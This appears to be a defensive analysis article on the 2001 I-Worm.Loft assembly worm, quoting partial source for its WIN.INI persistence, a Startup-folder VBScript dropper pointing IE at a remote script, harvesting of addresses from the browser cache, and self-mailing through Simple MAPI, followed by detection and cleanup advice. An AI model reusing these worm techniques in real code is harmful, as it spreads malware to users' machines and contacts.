# Dissecting I‑Worm.Loft: A Deep Dive into a Classic Assembly Worm 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
I‑Worm.Loft is a Windows worm written in 32‑bit assembly that surfaced in June 2001. Rather than exploits or packers, Loft leans on straightforward Win32 APIs, simple registry edits, and social engineering. It persists via the legacy WIN.INI mechanism, plants a Startup‑folder HTML page that nudges the user to enable ActiveX, rewrites Internet Explorer’s homepage on a specific date, and harvests email addresses from Internet Explorer’s cache to propagate via Simple MAPI. Because the code is clear and almost entirely user‑mode, Loft is an excellent specimen for source‑level learning: deterministic strings, predictable artifacts, and an unambiguous control flow that defenders can trace and emulate for detection.

This analysis references `USEFUL.INC` (a 29A helper include) used by the worm for inline string pushing and utility macros. We will map these macros to the concrete behavior observed in `Loft.asm` and highlight quirks that matter for detection and containment.

## Overview of the Malware 🐛
Loft executes in distinct phases, depending on installation state and a per‑user marker:

- Installation and persistence: If the process isn’t already `%System%\\LOFT.EXE`, the worm copies itself there and to `%WinDir%\\LOFT_STORY.EXE`, then writes `WIN.INI [windows] run=` to launch the system copy at logon.
- First‑run (per user) behavior: If a registry marker (`HKCU\\Software\\Microsoft\\PetiK`) does not exist, the worm creates `Loft.htm` in the current user’s Startup folder. The page embeds VBScript that asks the user to “accept ActiveX,” writes a Run entry for `C:\\ActiveX.vbs`, and sets IE’s Start Page to a remote VBScript URL.
- Date‑triggered changes: On the 28th of each month, it loads SHLWAPI to set IE’s homepage to a “loftstory” URL and overwrites `RegisteredOwner`/`RegisteredOrganization`, then shows a message box.
- Connectivity gate: It repeatedly checks `WININET!InternetGetConnectedState` every five seconds and continues only once connectivity is present.
- Harvest and email: It locates Internet Explorer’s “Cache” folder, enumerates `*.htm*`, memory‑maps each file, scans for `mailto:` links, and sends one email per address using Simple MAPI with `%WinDir%\\LOFT_STORY.EXE` attached and a fixed subject/body.

There is no command‑and‑control. Propagation is entirely opportunistic and local: user acceptance of ActiveX and email addresses harvested from cached pages.

## Section 2 – Source Code Analysis 🔬
Loft imports a small call helper (`callx`) and includes `USEFUL.INC` for glue macros and basic structures. Key macros used are `@pushsz` (inline NUL‑terminated string), `@pushbytes` (inline bytes), plus string helpers (`@copysz`, `@endsz`). The code keeps most constants inline in the text section via these macros, reducing explicit `.data` references.

### Install: copy and WIN.INI autorun
```asm
push 0
callx GetModuleHandleA
push 50
push offset szOrig
push eax
callx GetModuleFileNameA

push 50h
push offset szCopie
callx GetSystemDirectoryA
@pushsz "\\LOFT.EXE"
push offset szCopie
callx lstrcat

push 50h
push offset szCopieb
callx GetWindowsDirectoryA
@pushsz "\\LOFT_STORY.EXE"
push offset szCopieb
callx lstrcat

push offset szOrig
push offset szCopie
callx lstrcmp
jz   C_PTK

push 0
push offset szCopie
push offset szOrig
callx CopyFileA
push 0
push offset szCopieb
push offset szOrig
callx CopyFileA

@pushsz "\\WIN.INI"
push offset szWinini
callx lstrcat
@pushsz "run"
@pushsz "windows"
push offset szWinini
push offset szCopie
callx WritePrivateProfileStringA
```
- Purpose: Establish two copies, then persist via `WIN.INI [windows] run=`. This replaces the entire `run` value—any prior content is lost.
- Note: All path buffers (`sz*`) are only 50 bytes; on longer paths, concatenations can truncate.

### First‑run per‑user marker and Startup HTML drop
```asm
@pushsz "Software\\Microsoft\\PetiK"
push HKEY_CURRENT_USER
callx RegCreateKeyExA
cmp [regDisp],2
je  DATE

; Read Startup from HKEY_USERS .DEFAULT ... Shell Folders
@pushsz ".DEFAULT\\...\\Shell Folders"
callx RegOpenKeyExA
@pushsz "Startup"
callx RegQueryValueExA

; Create Startup\\Loft.htm and write embedded VBScript
@pushsz "\\Loft.htm"
call lstrcat
callx CreateFileA
callx WriteFile
```
- Purpose: Gate the HTML drop to the first run per user.
- Quirk: It reads the Startup path under `HKEY_USERS\\.DEFAULT`, which is the “Default User” profile on NT‑class systems, not the current user. That can misplace `Loft.htm` (weaker persistence).
- HTML payload: VBScript writes `HKLM\\...\\Run\\"ActiveX 1.0" = C:\\ActiveX.vbs`, sets IE’s download directory to `C:\\`, and points IE’s Start Page to `http://www.ctw.net/euphoria/ActiveX.vbs` (social engineering, not an exploit).

### Date‑based homepage and owner changes via SHSetValueA
```asm
callx GetSystemTime
cmp [SystemTime.wDay],28
jne DLL

@pushsz "SHLWAPI.dll"
callx LoadLibraryA
@pushsz "SHSetValueA"
callx GetProcAddress
mov [setvalue],eax

; IE Start Page = http://www.loftstory.fr (HKCU)
push 08h
@pushsz "http://www.loftstory.fr"
push 01h
@pushsz "Start Page"
@pushsz "Software\\Microsoft\\Internet Explorer\\Main"
push HKEY_CURRENT_USER
call [setvalue]

; RegisteredOrganization/Owner (HKLM)
@pushsz "LoftStory"            ; RegisteredOrganization
@pushsz "Aziz, Kenza, Loanna, etc..." ; RegisteredOwner
```
- Purpose: Cosmetic/system settings changes on the 28th of the month using `SHSetValueA` (less static linkage to Advapi32).

### Connectivity loop using WININET
```asm
@pushsz "WININET.dll"
callx LoadLibraryA
@pushsz "InternetGetConnectedState"
callx GetProcAddress
mov [netcheck],eax

NET:
  push 0
  push offset Temp
  call [netcheck]
  dec eax
  jnz  DODO
```
- Behavior: Polls connectivity every five seconds until available, then displays a welcome message and continues.

### IE cache scan and Simple MAPI email send
```asm
; Locate IE Cache and chdir
@pushsz ".DEFAULT\\...\\Shell Folders"
callx RegOpenKeyExA
@pushsz "Cache"
callx RegQueryValueExA
callx SetCurrentDirectoryA

; Enumerate and parse .htm*
@pushsz "*.htm*"
callx FindFirstFileA
call parse_html
callx FindNextFileA
...

; In parse_html: memory‑map file, then search "mailto:"
ls_scan_mail:
  call @mt
  db 'mailto:'
@mt:  pop edi
l_scan_mail:
  push 7
  pop ecx
  rep cmpsb
  je  scan_mail
  inc esi
  loop l_scan_mail
```
- Purpose: Map each HTML file and scan for `mailto:`. When found, it copies characters until a space or quote, requires at least one `@`, then sends one email via Simple MAPI.
- Data model: The code declares its own oversized `win32` record to hold `FindFirstFileA` results (filename field is dword‑based and larger than needed). It still works because the API writes the expected byte layout at the start.
- MAPI: Uses `MAPILogon` (default session) and `MAPISendMail`. Subject is “Loft Story News…”, body is “The last video of the <Loft story> program”, and the sender string in `.data` is `<redacted@loftstory.fr>`. The attachment path points to `%WinDir%\\LOFT_STORY.EXE`.

### How `USEFUL.INC` shapes the code
`USEFUL.INC` contributes utility macros and simple structures that make the assembly terse and position‑independent:
- `@pushsz` and `@pushbytes`: implement a call/pop “inline string” trick—place literal bytes after a `call`, then `pop` the return address to obtain a pointer to that inline string, avoiding extra `.data` symbols. Loft uses this pervasively for API names, registry paths, strings like `"mailto:"`, and file suffixes.
- `@copysz` / `@endsz`: helpers to copy NUL‑terminated strings via `lodsb/stosb` and to advance to the end of a string; handy before concatenation or when walking buffers.
- `Pushad_struc` / `Pusha_struc`: describe saved register layouts; the code uses `pushad/popad` in the parser to preserve volatile registers across string scanning and MAPI calls.
- `API_Args`: models an API call’s stack frame; while not directly dereferenced here, the push‑then‑`callx` pattern is consistent with such a layout and is common in 29A code.

## Section 3 – Mitigation and Defense Strategies 🛡️
- Legacy autoruns: Monitor and block writes to `WIN.INI` `[windows] run=`; alert on unexpected `%System%\\LOFT.EXE` and `%WinDir%\\LOFT_STORY.EXE`. On legacy images, baseline WIN.INI values and track diffs.
- Browser hardening: Where IE still exists, enforce Group Policy to lock the Start Page, disable VBScript/ActiveX in Internet and Local Machine zones, and prevent silent changes to the download directory.
- Startup folder hygiene: Audit each user’s Startup folder and flag HTML files containing `<SCRIPT Language=VBScript>` that write to Run keys or IE settings.
- Outlook/MAPI controls: Require user prompts for Simple MAPI sends from non‑mail clients; monitor for `MAPILogon`/`MAPISendMail` in unknown processes and block executable attachments at the mail gateway.
- Registry telemetry: Watch for `HKCU\\Software\\Microsoft\\PetiK` creation and for `SHLWAPI!SHSetValueA` writing `HKCU\\...\\Internet Explorer\\Main\\Start Page` and `HKLM\\...\\Registered*`.
- File and cache behaviors: Detect processes that memory‑map large numbers of `*.htm*` under IE’s Temporary Internet Files and scan for `mailto:`; this is unusual outside crawlers or indexers.
- Application control and privilege: Use allow‑listing to block unknown binaries from writing to Windows/System directories and Startup folders. Standard‑user execution reduces the impact on HKLM.
- Incident response checklist: Delete `%System%\\LOFT.EXE` and `%WinDir%\\LOFT_STORY.EXE`, restore `WIN.INI` `[windows] run`, remove `Loft.htm` from all Startup folders, re‑enforce IE homepage settings, clear `HKCU\\Software\\Microsoft\\PetiK`, and search mail logs for the characteristic subject/body.

## Conclusion
Loft embodies classic, user‑mode worm techniques: simple file copies, WIN.INI autorun, a Startup HTML dropper that relies on user action, cosmetic registry edits on a date trigger, and opportunistic propagation via email addresses scraped from the local browser cache. Its artifacts are highly deterministic, and its use of `USEFUL.INC` macros makes the assembly compact yet readable. Modern controls—locking down legacy autoruns, restricting ActiveX/VBScript and MAPI, monitoring IE cache abuse, and applying allow‑listing—are effective at both detection and prevention. For defenders maintaining legacy estates or analyzing historical samples, Loft offers a clear blueprint of behaviors to hunt and undo without ambiguity.